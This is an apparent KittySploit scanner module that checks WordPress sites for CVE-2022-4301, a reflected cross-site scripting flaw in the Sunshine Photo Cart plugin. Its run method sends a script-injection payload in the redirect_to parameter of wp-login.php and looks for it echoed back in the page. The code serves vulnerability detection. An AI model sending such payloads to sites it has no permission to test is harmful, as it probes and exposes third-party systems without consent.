#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Sunshine Photo Cart plugin before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Sunshine Photo Cart <2.9.15 - Cross-Site Scripting Detection',
        'description': 'WordPress Sunshine Photo Cart plugin before 2.9.15 contains a cross-site scripting vulnerability. The plugin does not sanitize and escape a parameter before outputting it back in the page. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'sunshine', 'wordpress', 'wp-plugin', 'wpscan', 'unauth', 'sunshinephotocart', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/a8dca528-fb70-44f3-8149-21385039179d',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-4301',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/cyllective/CVEs',
        ],
        'cve': 'CVE-2022-4301',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-login.php?action=register&redirect_to=x%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain)</script>', 'Registration Form',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Sunshine Photo Cart <2.9.15 - Cross-Site Scripting detected",
                path='/wp-login.php?action=register&redirect_to=x%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False

